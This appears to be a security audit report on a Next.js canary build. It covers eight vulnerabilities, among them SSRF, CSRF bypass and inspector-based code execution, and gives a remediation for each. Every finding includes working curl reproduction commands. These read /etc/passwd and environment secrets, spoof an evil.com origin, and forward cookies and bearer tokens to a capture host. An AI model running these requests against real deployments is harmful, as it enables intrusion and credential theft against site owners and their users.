# Next.js Security Audit Report

## Executive Summary

This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Eight issues were identified and confirmed against live instances in a Docker-based test environment:

| ID | Title | Severity |
|----|-------|----------|
| VULN-1 | SSRF via Image Optimizer Redirect (remotePatterns bypass) | High |
| VULN-2 | Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS) | High |
| VULN-3 | Server Actions Execute Without Origin Header (defense-in-depth gap) | Medium |
| VULN-4 | Arbitrary File Read via Source Map Endpoint (webpack dev server) | High |
| VULN-5 | Unauthenticated V8 Inspector Open via Dev Endpoint | High |
| VULN-6 | Path Traversal in launch-editor via isAppRelativePath | Medium |
| VULN-7 | Server Action CSRF Bypass via x-forwarded-host Header Injection | High |
| VULN-8 | Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts | High |

All eight vulnerabilities are independently reproducible using the provided exploit scripts.

---

## Scope

- **Repository:** next.js
- **Commit:** `007051470157d38058730ffa0a1983d4b4106424`
- **Version:** 16.3.0-canary.29
- **Testing Environment:** Docker containers on a private bridge network (`audit-net`)
- **Test Modes:** Production (`next build` + `next start`) and Dev mode (`next dev --webpack`)
- **Testing Date:** 2026-05-26

---

## VULN-1: SSRF via Image Optimizer Redirect (remotePatterns bypass)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/image-optimizer.ts:454` — `validateParams` checks `hasRemoteMatch` on the initial URL only
- `packages/next/src/server/image-optimizer.ts:909-928` — `fetchExternalImage` follows redirects recursively without re-validating the redirect target against `remotePatterns`

**Root Cause:**

The `validateParams` function correctly validates that the requested image URL matches the configured `remotePatterns` allowlist. However, `fetchExternalImage` uses `fetch(..., { redirect: 'manual' })` and manually follows redirect responses by calling itself recursively with the `Location` header value. This recursive call passes the redirect target URL directly to `fetchExternalImage` without re-running the `remotePatterns` check via `validateParams` or `hasRemoteMatch`.

An attacker who controls any server in `remotePatterns` (or can intercept traffic to it) can redirect the image optimizer to an arbitrary host.

**Attack Scenario:**

A production deployment allows `remotePatterns` for `images.example.com` (legitimate CDN). An attacker sets up a redirect at `https://images.example.com/evil-redirect` that points to `http://internal-metadata-server/latest/meta-data/`. The image optimizer fetches the redirect target and returns its content as an "image," exfiltrating internal service data.

In the audit environment: `remotePatterns` allows `audit-redirect-server:8080`. A request to `/_next/image?url=http://audit-redirect-server:8080/redirect-to-secret&w=640&q=75` causes the optimizer to follow a redirect to `audit-secret-server:9090`, which is not in `remotePatterns`.

**Reproduction Steps:**

```bash
# Negative control — direct access to secret server is blocked (400)
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-secret-server%3A9090%2Fsecret-image.jpg&w=640&q=75'
# Expected: 400

# Positive exploit — redirect server in remotePatterns, redirects to secret server
curl -s -o /tmp/exploit.bin -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-redirect-server%3A8080%2Fredirect-to-secret&w=640&q=75'
# Expected: 200

# Confirm secret server received the request
docker logs audit-secret-server 2>&1 | grep SECRET_ACCESS
# Expected: SECRET_ACCESS: <timestamp> <ip>
```

**Evidence:**
- Direct request to `audit-secret-server:9090` returns HTTP 400 confirming `remotePatterns` blocks it
- Redirect-mediated request returns HTTP 200 with image data from `audit-secret-server:9090`
- Secret server logs show `SECRET_ACCESS` entry from the Next.js container

**Remediation:**

Re-validate the redirect target against `remotePatterns` before following it. In `fetchExternalImage`, before recursing with the redirect URL, call `hasRemoteMatch(domains, remotePatterns, new URL(redirect))` and throw an `ImageError` if the redirect target is not in the allowlist. This requires threading `domains` and `remotePatterns` through `fetchExternalImage`'s call signature.

Alternatively, use `redirect: 'follow'` in the initial `fetch()` call only after ensuring the final URL matches `remotePatterns` by using a redirect hook or by resolving the full redirect chain before fetching.

---

## VULN-2: Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS)

**Severity:** High (requires `NEXT_PRIVATE_TEST_HEADERS` env var to be set in production — a configuration error, not a default-state vulnerability)

**Affected Code:**
- `packages/next/src/server/lib/router-server.ts:230` — conditional skip of `filterInternalHeaders`
- `packages/next/src/server/lib/server-ipc/utils.ts:42-64` — `INTERNAL_HEADERS` list and `filterInternalHeaders` implementation
- `packages/next/src/server/async-storage/request-store.ts:117-143` — `mergeMiddlewareCookies` reads `x-middleware-set-cookie` from request headers

**Root Cause:**

`router-server.ts` calls `filterInternalHeaders(req.headers)` to strip internal Next.js headers from incoming requests before processing. This is the primary security boundary preventing external callers from spoofing internal headers. The bypass:

```typescript
// router-server.ts:230
if (!process.env.NEXT_PRIVATE_TEST_HEADERS) {
  filterInternalHeaders(req.headers)
}
```

When the env var `NEXT_PRIVATE_TEST_HEADERS=1` is set, all internal header filtering is skipped. An external client can then send `x-middleware-set-cookie` with arbitrary cookie values. `mergeMiddlewareCookies` in `request-store.ts` reads this header and merges it into the `cookies()` store, making the attacker-controlled values available to any code that calls `await cookies()`.

**Attack Scenario:**

A developer or CI pipeline accidentally sets `NEXT_PRIVATE_TEST_HEADERS=1` in a production or staging environment. An external attacker sends:

```
x-middleware-set-cookie: session=admin_session_token; Path=/
```

Any server component reading `cookies().get('session')` now sees `admin_session_token`, bypassing session-based authentication entirely.

**Reproduction Steps:**

```bash
# Normal app (port 3000) — header is filtered, shows Access Denied
curl -s \
  -H 'x-middleware-set-cookie: session=admin_session_token; Path=/' \
  'http://localhost:3000/protected'
# Expected: contains "Access Denied"

# Test-headers app (port 3001, NEXT_PRIVATE_TEST_HEADERS=1) — header passes through
curl -s \
  -H 'x-middleware-set-cookie: session=admin_session_token; Path=/' \
  'http://localhost:3001/protected'
# Expected: contains "ADMIN_SECRET_DATA: launch_codes_42"
```

**Evidence:**
- Port 3000 (normal): returns `Access Denied` regardless of injected headers
- Port 3001 (`NEXT_PRIVATE_TEST_HEADERS=1`): returns `ADMIN_SECRET_DATA: launch_codes_42` with injected session cookie

**Remediation:**

`NEXT_PRIVATE_TEST_HEADERS` must never be set in production or staging environments. Its name already signals test-only usage, but the risk should be documented explicitly. Consider:

1. Adding a startup warning when `NEXT_PRIVATE_TEST_HEADERS` is set and `NODE_ENV` is `production`.
2. Restricting the bypass further — e.g., only allow it when also in `NODE_ENV=test` or when a specific CI flag is set.
3. Documenting `NEXT_PRIVATE_TEST_HEADERS` as a security-sensitive variable in the framework's environment variable documentation.

---

## VULN-3: Server Actions Execute Without Origin Header (defense-in-depth gap)

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:646-651` — explicit allowance for requests without `origin` header
- `packages/next/src/server/app-render/action-handler.ts:1388` — `ACTION_ID_EXPECTED_LENGTH = 42`

**Root Cause:**

The CSRF protection in Server Actions checks the `origin` header against the `host`/`x-forwarded-host` header. When no `origin` header is present, the code logs a warning but allows the action to proceed:

```typescript
// action-handler.ts:646-651
if (!originHost) {
  // This is a handcrafted request without an origin or a request from an unsafe browser.
  // We'll let this through but log a warning.
  // We can't guard against unsafe browsers and handcrafted requests can't contain
  // user credentials that haven't been shared willingly.
  warning = 'Missing `origin` header from a forwarded Server Actions request.'
}
```

This is an explicitly documented design decision. The logic is that handcrafted requests (curl, scripts) cannot obtain user credentials without cooperation; only browser-originated cross-site requests — which always include an `Origin` header — pose real CSRF risk.

**Important caveat:** This behavior is intentional. The comment in the source code accurately describes the threat model. A standard browser-based CSRF attack will always send an `Origin` header, and the check handles that case. This is a defense-in-depth gap rather than an exploitable vulnerability in the traditional sense.

**Residual risk scenario:**

The gap becomes relevant in environments where:
1. A compromised proxy or middleware strips or suppresses `Origin` headers before they reach Next.js, or
2. A victim's credentials (cookies) are somehow already known to an attacker (e.g., via a separate leak), and the attacker wants to invoke server actions on the victim's behalf using a scripted request.

In both cases, the attacker can invoke server actions without triggering CSRF protection, provided they also supply valid session credentials.

**Reproduction Steps:**

```bash
# Extract action ID from built manifest (42 hex chars per ACTION_ID_EXPECTED_LENGTH)
ACTION_ID=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json \
  | grep -oE '[0-9a-f]{42}' | head -1)

# Invoke server action without Origin header
curl -s -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_session" \
  --data '[]' \
  'http://localhost:3000/'
# Expected: HTTP 200, action executes, response contains session value
```

**Evidence:**
- Action executes and returns HTTP 200 without `origin` header
- Server logs show warning: `Missing 'origin' header from a forwarded Server Actions request`
- With a mismatched `Origin` header, the action is rejected with "Invalid Server Actions request"

**Remediation:**

The current behavior is a deliberate trade-off. Options to improve defense-in-depth:

1. **Require explicit opt-in for missing-origin allowance:** Add a framework config option (e.g., `serverActions.allowMissingOrigin: false`) to reject requests with no `Origin` header in production.
2. **Document the threat model:** Add explicit documentation explaining why missing-origin requests are allowed and under what deployment conditions this becomes a risk (compromised proxies, credential-sharing scenarios).
3. **Add stricter default for production:** Consider rejecting missing-origin requests by default in production mode (`NODE_ENV=production`) and allowing them only in development.

---

---

## VULN-4: Arbitrary File Read via Source Map Endpoint (webpack dev server)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:697-710` — `/__nextjs_source-map` handler, user-controlled `filename` with no validation
- `packages/next/src/server/dev/get-source-map-from-file.ts:26-80` — `getSourceMapFromFile`: reads arbitrary file, follows `//# sourceMappingURL=` to a second arbitrary file, parses and returns it as JSON

**Root Cause:**

The `/__nextjs_source-map` endpoint is registered by the webpack hot-reloader. It accepts a `filename` query parameter, converts it to a `file://` URL if the path is absolute, and calls `getSourceMapFromFile`. That function:

1. Reads the file at the supplied path via `fs.readFile` with no path validation or allowlist.
2. Scans for a `//# sourceMappingURL=<target>` comment and resolves the target path via `path.resolve(path.dirname(filename), decodeURIComponent(sourceUrl))` — again with no validation.
3. Reads the resolved target path, parses it as JSON, and returns the parsed source map (including `sourcesContent`) to the client.

There is no authentication on this endpoint. Cross-origin requests from curl (no `Origin` header) are allowed because `blockCrossSiteDEV` returns `false` when `originLowerCase` is `undefined`.

**Error oracle:** For non-existent or non-readable files, the endpoint returns HTTP 500 with the error message (including the filename) in the response body — functioning as a file existence oracle for arbitrary paths.

**Attack Scenario:**

Any process or script that can reach the dev server's port can read arbitrary files on the filesystem. By constructing a "chain" file containing `//# sourceMappingURL=/path/to/target`, the attacker causes the endpoint to read and return the target file's contents. If the target is valid JSON (e.g., a `.json` config file, a source map, or a crafted file containing secrets), the full contents are returned. For non-JSON targets (e.g., `/etc/passwd`), a 500 error with the target path confirms file existence.

In the audit environment: `/tmp/chain.js` contains `//# sourceMappingURL=/tmp/secret_sourcemap.json`. Requesting `/__nextjs_source-map?filename=/tmp/chain.js` returns a 200 with `sourcesContent: ["DEV_SECRET_KEY=sk-live-production-key-12345"]`.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 500 with path in error
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/nonexistent/path.js'
# Expected: 500 with error body mentioning the path

# Positive exploit — chain file exfiltrates secret_sourcemap.json contents
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain.js'
# Expected: 200 JSON with sourcesContent containing DEV_SECRET_KEY

# System file probe — chain_etc_passwd.js follows sourceMappingURL to /etc/passwd
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain_etc_passwd.js'
# Expected: 500 with JSON parse error referencing /etc/passwd (file was read)
```

**Evidence:**
- HTTP 200 response to chain.js request contains `DEV_SECRET_KEY=sk-live-production-key-12345` from `sourcesContent`
- HTTP 500 response to chain_etc_passwd.js request contains error referencing `/etc/passwd` — proving the file was read and attempted to parse as JSON
- HTTP 500 response to nonexistent path request contains the supplied path — confirming file existence oracle

**Remediation:**

Restrict the `filename` parameter to paths within the project root (or the webpack compilation output directory). Validate that the resolved path starts with the Next.js root directory before calling `fs.readFile`. Apply the same check to the resolved `sourceMappingURL` target path. Alternatively, only serve source maps for modules that are actually tracked in the webpack module graph, rejecting requests for arbitrary filesystem paths.

---

## VULN-5: Unauthenticated V8 Inspector Open via Dev Endpoint

**Severity:** High

**Affected Code:**
- `packages/next/src/next-devtools/server/attach-nodejs-debugger-middleware.ts:13-43` — `/__nextjs_attach-nodejs-inspector` handler, no authentication, calls `inspector.open(debugPort)` unconditionally

**Root Cause:**

The `/__nextjs_attach-nodejs-inspector` endpoint is registered by both webpack and Turbopack hot-reloaders. It accepts GET requests from any caller (no authentication, no method restriction, no Origin check). When called, it:

1. Calls `inspector.open(debugPort)` to start the V8 inspector if it is not already running.
2. Fetches `http://{inspectorURL.host}/json/list` from the now-running inspector.
3. Returns the first debug target's `devtoolsFrontendUrl` in a JSON response.

Any caller who can reach the dev server port can force the V8 inspector open and obtain the WebSocket debugger URL. From there, CDP `Runtime.evaluate` can execute arbitrary JavaScript in the Node.js process — reading environment variables, filesystem contents, making network calls, or spawning child processes.

**Severity note:** The default `inspector.open()` binding is `127.0.0.1:9229` (localhost only). On a local dev machine, this is reachable by any local process or a web page exploiting DNS rebinding on localhost. To simulate a network-accessible scenario (e.g., a container or VM exposed to a LAN), the PoC starts `next dev` with `NODE_OPTIONS='--inspect=0.0.0.0:9229'`. The core vulnerability — unauthenticated `inspector.open()` with no opt-in — exists regardless of binding address.

**Attack Scenario:**

A developer runs `next dev` on a machine accessible to other users or processes (shared dev server, LAN, CI environment). Any local process calls `GET /__nextjs_attach-nodejs-inspector`. The V8 inspector opens. The attacker connects via CDP WebSocket, sends `Runtime.evaluate` commands, and reads secrets from `process.env`, reads source files, or exfiltrates data. This requires no credentials and leaves no application-level log entry.

**Reproduction Steps:**

```bash
# Step 1: Open inspector without authentication
curl -s 'http://localhost:3002/__nextjs_attach-nodejs-inspector'
# Expected: 200 JSON with devtoolsFrontendUrl

# Step 2: Get WebSocket debugger URL
curl -s 'http://localhost:9230/json/list'
# Expected: JSON array with webSocketDebuggerUrl

# Step 3: Execute arbitrary code via CDP
WS_URL=$(curl -s 'http://localhost:9230/json/list' | grep -o '"ws://[^"]*"' | head -1 | tr -d '"')
node autofyn_audit/exploits/inspector_rce.mjs "$WS_URL" "require('fs').readFileSync('/etc/passwd','utf-8')"
# Expected: contents of /etc/passwd

node autofyn_audit/exploits/inspector_rce.mjs "$WS_URL" "JSON.stringify(process.env)"
# Expected: JSON object containing all environment variables including secrets
```

**Evidence:**
- `/__nextjs_attach-nodejs-inspector` returns 200 with devtools URL without any credentials
- CDP `Runtime.evaluate` successfully executes `fs.readFileSync('/etc/passwd')` — output includes `root:x:0:0:root`
- CDP `Runtime.evaluate` returns `process.env` including `REACT_EDITOR` and all container environment variables

**Remediation:**

Gate the `/__nextjs_attach-nodejs-inspector` endpoint behind a check that the request originates from localhost (or from the same user session). Require an explicit opt-in environment variable (e.g., `NEXT_ENABLE_INSPECTOR=1`) rather than opening the inspector on any unauthenticated request. At minimum, validate the `Origin` header or require a secret token passed as a query parameter.

---

## VULN-6: Path Traversal in launch-editor via isAppRelativePath

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:646-654` — `/__nextjs_launch-editor` handler: `path.join('app', isSrcDir ? 'src' : '', relativeFilePath)` does not sanitize traversal sequences
- `packages/next/src/next-devtools/server/launch-editor.ts:455-469` — `filePath = path.join(nextRootDirectory, file)`: resolves traversal to absolute path, then calls `fsp.access(filePath, F_OK)` and `launchEditor(filePath, ...)`

**Root Cause:**

When `isAppRelativePath=1` is supplied, the handler computes `appPath = path.join('app', '', relativeFilePath)`. Node's `path.join` normalizes `..` components: `path.join('app', '', '../../../../etc/passwd')` = `../../../../etc/passwd`. This relative path is then passed to `launch-editor.ts`, which prepends the Next.js root directory: `path.join('/app', '../../../../etc/passwd')` = `/etc/passwd`.

The code then calls `fsp.access(filePath, F_OK)` — returning HTTP 204 if the file exists, and HTTP 404 otherwise. This creates a **file existence oracle**: an attacker can enumerate arbitrary filesystem paths by observing the 204/404 differential.

With `REACT_EDITOR=cat` (or any other non-editor binary) set in the environment, matching files are additionally passed to `child_process.spawn(editor, [filePath])`. This amplifies the oracle to include a command execution side-channel (output goes to server stdout).

**Note:** The file existence oracle is the primary exploit and requires no environment configuration. The command execution side-channel requires the server to have a permissive `REACT_EDITOR` setting, which is not the default.

**Attack Scenario:**

An attacker on the network (or any local process) sends:
```
GET /__nextjs_launch-editor?file=../../../../etc/shadow&isAppRelativePath=1
```
A 204 response confirms `/etc/shadow` is readable. By iterating over common secret file paths (`/root/.ssh/id_rsa`, `/etc/secrets/db-password`, etc.), the attacker maps the server's filesystem without any authentication.

The same vulnerability is present in `middleware-turbopack.ts:399-409` — the path traversal applies regardless of bundler.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 404
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=nonexistent_xyz.txt&isAppRelativePath=1'
# Expected: 404

# Positive exploit — path traversal to /etc/passwd
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../etc/passwd&isAppRelativePath=1'
# Expected: 204 (file exists at /etc/passwd — traversal confirmed)

# Secret file probe
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../tmp/dev_secret.txt&isAppRelativePath=1'
# Expected: 204 (file exists outside project root)
```

**Evidence:**
- Nonexistent file returns 404 — baseline confirmed
- `../../../../etc/passwd` traversal returns 204 — `/etc/passwd` found outside `/app`
- `../../../../tmp/dev_secret.txt` traversal returns 204 — confirms oracle reaches `/tmp`

**Remediation:**

After computing `appPath`, validate that `path.resolve(nextRootDirectory, appPath)` starts with `nextRootDirectory` before proceeding. Alternatively, validate `relativeFilePath` does not contain `..` components. The `path.resolve` + prefix check pattern is the standard mitigation for path traversal in Node.js.

---

## VULN-7: Server Action CSRF Bypass via x-forwarded-host Header Injection

**Severity:** High

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:482-518` — `parseHostHeader`: when called without `originDomain`, unconditionally returns `x-forwarded-host` value if present, prioritizing it over the `host` header
- `packages/next/src/server/app-render/action-handler.ts:635,652` — CSRF check calls `parseHostHeader(req.headers)` (without `originDomain`) and compares `originHost` against the returned value
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-forwarded-host`, so it is never stripped by `filterInternalHeaders`

**Root Cause:**

The CSRF check for Server Actions compares the `origin` header's host against the value returned by `parseHostHeader(req.headers)`. The `parseHostHeader` function, when called without the optional `originDomain` parameter (as it is at line 635), returns `x-forwarded-host` unconditionally if that header is present, falling back to `host` only if `x-forwarded-host` is absent.

The `filterInternalHeaders` function in `server-ipc/utils.ts` strips headers in the `INTERNAL_HEADERS` list from incoming requests before processing. `x-forwarded-host` is not in this list. An external attacker can therefore inject `x-forwarded-host` with an arbitrary value.

Attack: send `Origin: https://evil.com` (sets `originHost = "evil.com"`) together with `x-forwarded-host: evil.com` (sets `host.value = "evil.com"` via `parseHostHeader`). The CSRF check `originHost === host.value` evaluates `"evil.com" === "evil.com"` — match passes. The action executes.

**Note:** `parseHostHeader` has an `originDomain` parameter (lines 493-504) designed to constrain which host values can be returned. However, the actual CSRF check at line 635 never passes `originDomain`. The defense exists in code but is not wired up.

**Precondition:** Next.js must be directly internet-facing without an upstream proxy that rewrites or removes `x-forwarded-host`. Deployments behind Nginx, Cloudflare, or a load balancer that sets `x-forwarded-host` to the actual client hostname are NOT affected — the proxy's value overwrites the attacker's.

**Browser mitigation note:** Modern browsers default to `SameSite=Lax` for cookies, which prevents cross-site POST requests from including cookies. This mitigates the browser-based CSRF vector for cookies without explicit `SameSite=None`. However, the bypass remains exploitable for: (1) applications that set `SameSite=None` on session cookies (common for cross-site embedding or OAuth flows), (2) non-browser attack scenarios (compromised proxies, network intermediaries, or scripted requests with stolen credentials), and (3) any deployment where cookies are explicitly configured as `SameSite=None; Secure`.

**Attack Scenario:**

A Next.js application is deployed directly on a cloud VM without a reverse proxy. A cross-origin attacker wants to invoke a Server Action (e.g., a privileged mutation) on behalf of a victim user. Normal CSRF protection rejects requests where `Origin` does not match `host`. The attacker sends:

```
Origin: https://evil.com
x-forwarded-host: evil.com
```

The CSRF check passes. The attacker invokes the Server Action with the victim's session cookie (obtained via a separate XSS or cookie-stealing attack), executing the privileged operation.

**Reproduction Steps:**

```bash
# Extract 42-char action ID from manifest
ACTION_ID=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json \
  | grep -oE '[0-9a-f]{42}' | head -1)

# Negative control — mismatched Origin, no x-forwarded-host (should be rejected)
NEG_STATUS=$(curl -s -o /tmp/neg_body.txt -w '%{http_code}' -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  --data '[]' \
  'http://localhost:3000/')
# Expected: non-200 status, OR body contains "Invalid Server Actions request"

# Positive exploit — Origin: https://evil.com + x-forwarded-host: evil.com (should bypass)
curl -s -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  -H "x-forwarded-host: evil.com" \
  --data '[]' \
  'http://localhost:3000/'
# Expected: HTTP 200, no "Invalid Server Actions request" in body
```

**Evidence:**
- Without `x-forwarded-host`: request rejected (non-200 status or CSRF error body) — baseline protection confirmed
- With `x-forwarded-host: evil.com`: request returns HTTP 200 without CSRF error — bypass confirmed
- `INTERNAL_HEADERS` in `utils.ts:42-54` does not include `x-forwarded-host` — header passes unstripped

**Remediation:**

Option 1: Add `x-forwarded-host` to the `INTERNAL_HEADERS` list in `server-ipc/utils.ts`. This strips the header for all external requests, preventing injection. Deployments that legitimately rely on `x-forwarded-host` would need to configure trust explicitly.

Option 2: Wire the `originDomain` parameter at `action-handler.ts:635`: change `parseHostHeader(req.headers)` to `parseHostHeader(req.headers, originHost)`. This makes the function return a value only if it matches the origin, regardless of which header provides it.

Option 3: Add a `serverActions.trustXForwardedHost` config flag (defaulting to `false`) that controls whether `x-forwarded-host` is trusted for CSRF checking, similar to the `trustHost` pattern used in other frameworks.

---

## VULN-8: Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts

**Severity:** High

**Affected Code:**
- `packages/next/src/server/lib/router-utils/proxy-request.ts:25-36` — `proxyRequest`: creates `http-proxy` instance with `changeOrigin: true`; `http-proxy` forwards all original request headers (including `Cookie` and `Authorization`) to the target by default
- `packages/next/src/server/lib/router-server.ts:499-508` — calls `proxyRequest(req, res, parsedUrl, ...)` when middleware rewrite destination has a protocol (cross-origin), with no host validation
- `packages/next/src/server/lib/router-utils/resolve-routes.ts:726-739` — when `x-middleware-rewrite` contains a cross-origin URL, returns `{finished: true, parsedUrl}` with the full external URL preserved in `parsedUrl`
- `packages/next/src/server/web/utils.ts:141-152` — `validateURL`: validates only that the rewrite destination is a parseable absolute URL; performs no host allowlist check

**Root Cause:**

`NextResponse.rewrite(destination)` sets the `x-middleware-rewrite` response header to the destination URL. When the destination is on a different origin than the application (different host or protocol), `resolve-routes.ts` returns `finished: true` with the full external URL. `router-server.ts` then calls `proxyRequest`, which uses `http-proxy` to forward the original request — including ALL headers — to the external target.

There is no host allowlist or validation for rewrite destinations at any point in this pipeline. Any URL that passes `new URL()` parsing is accepted. Crucially, `http-proxy` forwards the `Cookie` and `Authorization` headers from the original client request to the attacker-controlled destination.

This means that a middleware reading any user-controlled value (query parameter, header, path segment) and using it as a rewrite destination enables SSRF with full credential forwarding.

**Attack Scenario:**

A Next.js application uses middleware to route to different backends based on a query parameter (a common pattern for multi-tenant routing, A/B testing, or locale-based backends). An attacker sends a request to the application with a crafted `?backend=` parameter pointing to an attacker-controlled server. The middleware rewrites to the attacker's server. The `proxyRequest` call forwards the victim user's `Cookie` and `Authorization` headers to the attacker's server, leaking credentials.

In a realistic scenario: a victim user visits `https://app.example.com/?backend=https://attacker.com/steal` (e.g., via a phishing link or injected URL). The middleware rewrites the request to `attacker.com/steal`, forwarding the victim's session cookie. The attacker logs the cookie and takes over the session.

**Reproduction Steps:**

```bash
# Negative control — normal request returns the app page
curl -s 'http://localhost:3003/'
# Expected: HTTP 200 with "Middleware Audit App" in body

# Positive exploit — rewrite to attacker-controlled server with victim credentials
curl -s \
  -H "Cookie: session=VICTIM_SECRET_TOKEN_12345" \
  -H "Authorization: Bearer sk-secret-api-key-67890" \
  'http://localhost:3003/?backend=http://audit-credential-capture:9091/steal'
# Expected: HTTP 200 (proxy completed successfully)

# Verify credentials were captured by attacker server
docker logs audit-credential-capture 2>&1 | grep CREDENTIAL_CAPTURED
# Expected: lines containing VICTIM_SECRET_TOKEN_12345 and sk-secret-api-key-67890
```

**Evidence:**
- Normal request (`GET /`) returns HTTP 200 with app page — app running correctly
- Exploit request with `?backend=http://audit-credential-capture:9091/steal` returns HTTP 200
- `docker logs audit-credential-capture` shows `CREDENTIAL_CAPTURED: cookie=session=VICTIM_SECRET_TOKEN_12345` and `CREDENTIAL_CAPTURED: authorization=Bearer sk-secret-api-key-67890`

**Remediation:**

Option 1: Strip credential headers (`Cookie`, `Authorization`, `X-Auth-*`) before proxying to cross-origin rewrite destinations in `proxy-request.ts`. Credentials should only be forwarded to the application's own origin.

Option 2: Add a `rewrites.allowedExternalHosts` config option (analogous to `images.remotePatterns`) that restricts which external hosts middleware may rewrite to. Reject rewrites to hosts not in the allowlist.

Option 3: Document the credential-forwarding behavior prominently in the `NextResponse.rewrite()` documentation, so developers using user-controlled values as rewrite destinations understand the risk. This is a mitigation, not a fix.

---

## Appendix: Test Environment

```
audit-net (Docker bridge network)
  |
  +-- audit-nextjs-app (3000:3000) — next start, production mode
  +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
  +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack, NODE_OPTIONS=--inspect=0.0.0.0:9229
  +-- audit-middleware-app (3003:3000) — next start, production mode, middleware SSRF target
  +-- audit-redirect-server (8080:8080) — issues 302 redirect to secret server
  +-- audit-secret-server (9090:9090) — serves JPEG, logs access
  +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
```

To reproduce all findings:
```bash
bash autofyn_audit/setup.sh
bash autofyn_audit/run_all_exploits.sh
bash autofyn_audit/teardown.sh
```
